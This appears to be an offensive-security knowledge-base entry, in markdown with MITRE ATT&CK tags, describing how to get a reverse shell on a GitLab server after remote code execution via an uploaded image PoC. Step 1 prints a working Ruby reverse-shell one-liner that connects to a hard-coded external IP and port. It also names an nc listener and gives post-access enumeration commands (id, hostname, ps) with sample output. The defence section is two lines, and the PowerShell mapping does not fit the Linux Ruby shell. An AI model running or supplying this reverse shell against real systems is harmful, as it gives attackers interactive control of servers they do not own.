---
tags:
  - reverse-shell
  - rce
  - enumeration
type: procedure
tools:
  - '[[tools/ExifTool]]'
  - '[[tools/GitLab-Workhorse]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/perl-qx-execute-shell]]'
  - '[[commands/echo-write-file]]'
  - '[[commands/ruby-reverse-shell]]'
  - '[[commands/id-user-info]]'
  - '[[commands/hostname-alias]]'
  - '[[commands/ps-process-list]]'
platforms:
  - Linux
techniques:
  - '[[Command-Line Interface]]'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques:
  - '[[PowerShell]]'
id: 5ecd518e-9753-4e62-bcf0-dcecf6e95a0f
created_at: '2025-12-11T06:10:22.447Z'
updated_at: '2025-12-11T06:10:22.447Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1059]]'
---
# Establish Reverse Shell via Uploaded PoC

## Summary

This procedure uses a modified PoC to establish a reverse shell on the GitLab server after RCE, allowing command execution and system enumeration as the git user.

## Description

The reverse shell PoC embeds a Ruby script that connects back to an attacker-controlled host, enabling interactive shell access to run commands like id, hostname, and ps for reconnaissance.

## Requirements

1. Listener set up on attacker machine (e.g., nc -lvnp 12345)
2. Modified PoC (reverse_shell.jpg) with target IP/port
3. Prior successful upload triggering RCE

## Defense

Defensive measures and detection strategies:

- Network monitoring for outbound connections to unusual IPs/ports
- Anomaly detection on process creations from GitLab services

## Objectives

1. Gain interactive shell access
2. Enumerate user, host, and processes
3. Potential for further compromise

## Instructions

### Step 1: Upload Reverse Shell PoC

**Context**: Upload the PoC configured with attacker IP/port.

Follow upload steps with reverse_shell.jpg, triggering [[commands/ruby-reverse-shell]].

```bash
ruby -rsocket -e exit if fork;c=TCPSocket.new("103.3.61.137",12345);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end
```

> Establishes connection.

### Step 2: Verify User Context

**Context**: Run id to confirm execution context.

Execute [[commands/id-user-info]]:

```bash
id
```

> Output: uid=500(git) gid=500(git) groups=500(git)

### Step 3: Identify Host

**Context**: Get hostname alias.

Execute [[commands/hostname-alias]]:

```bash
hostname -a
```

> Output: web-09-sv-gprd

### Step 4: Enumerate Processes

**Context**: List running processes.

Execute [[commands/ps-process-list]]:

```bash
ps auxww
```

> Detailed process list.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Command-Line Interface]]

### Sub-Techniques

- [[PowerShell]]

## Commands Used

- [[commands/ruby-reverse-shell]]
- [[commands/id-user-info]]
- [[commands/hostname-alias]]
- [[commands/ps-process-list]]

## Tools Used

- [[tools/ExifTool]]

## Tags

- reverse-shell
- rce
